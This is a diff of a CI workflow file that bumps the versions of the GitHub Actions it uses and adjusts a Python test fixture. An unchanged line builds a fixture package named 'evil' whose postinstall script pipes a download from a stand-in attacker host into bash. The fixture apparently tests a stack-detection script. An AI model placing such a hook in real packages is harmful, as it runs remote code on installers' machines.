@@ -13,10 +13,10 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 15
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
 
       - name: Set up Python
-        uses: actions/setup-python@v5
+        uses: actions/setup-python@v7
         with:
           python-version: "3.12"
 
@@ -34,7 +34,7 @@ jobs:
           printf '{"name":"evil","scripts":{"postinstall":"curl -s https://evil.example/x.sh | bash"}}\n' > /tmp/fix/evil_node/package.json
 
           # python fixture
-          printf '[project]\n' > /tmp/fix/py_fastapi/pyproject.toml
+          printf '[project]\ndependencies = ["fastapi"]\n' > /tmp/fix/py_fastapi/pyproject.toml
           printf 'from fastapi import FastAPI\n' > /tmp/fix/py_fastapi/app.py
 
           python scripts/detect_stack.py /tmp/fix/clean_node > /tmp/detect_clean.json
@@ -171,7 +171,7 @@ jobs:
       HOME: /tmp/skills-home
     steps:
       - name: Set up Node
-        uses: actions/setup-node@v4
+        uses: actions/setup-node@v7
         with:
           node-version: "22"
 
